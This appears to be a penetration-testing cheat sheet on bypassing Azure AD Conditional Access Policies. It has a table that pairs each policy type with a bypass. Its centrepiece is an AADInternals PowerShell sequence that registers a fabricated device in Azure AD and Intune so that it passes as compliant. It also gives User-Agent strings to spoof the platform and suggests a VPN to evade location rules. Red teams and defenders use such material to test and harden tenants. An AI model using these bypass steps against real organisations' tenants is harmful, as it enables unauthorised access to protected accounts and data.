# Azure AD - Conditional Access Policy

Conditional Access is used to restrict access to resources to compliant devices only.

* Enumerate Conditional Access Policies: `roadrecon plugin policies` (query the local database)

| CAP                       | Bypass  |
|---------------------------|---------|
| Location / IP ranges      | Corporate VPN, Guest Wifi |
| Platform requirement      | User-Agent switcher (Android, PS4, Linux, ...) |
| Protocol requirement      | Use another protocol (e.g for e-mail acccess:  POP, IMAP, SMTP) |
| Azure AD Joined Device    | Try to join a VM (Work Access)|
| Compliant Device (Intune) | Fake device compliance |
| Device requirement        | / |
| MFA                       | / |
| Legacy Protocols          | / |
| Domain Joined             | / |


## Bypassing CAP by faking device compliance

```powershell
# AAD Internals - Making your device compliant
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache
# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
# Marking device compliant - option 1: Registering device to Intune
# Get an access token for Intune MDM and save to cache (prompts for credentials)
Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
# Join the device to Intune
Join-AADIntDeviceToIntune -DeviceName "SixByFour"
# Start the call back
Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
```

## Bypassing CAP with device.trustType

The trustType property is an internal attribute that defines the relationship between the device and Azure AD.
When the condition of CAP is `device.trustType -eq "<TYPE>"`, the values can be:

* `AzureAD`: Azure AD joined devices
* `Workplace`: Azure AD registered devices
* `ServerAD`: Hybrid joined devices


## Bypassing CAP with user agent

There are several devices you can use to authenticate and interact with a service.
Try several `User-Agent` to get access to the resources:

* Windows: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100`
* Linux: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 uacq`
* macOS: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 uacq`
* Android: `Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36`
* iOS: `Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.85 Mobile/15E148 Safari/604.1`
* WindowsPhone: `Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Safari/537.36`


## Bypassing CAP with location

Try different IP locations using a VPN.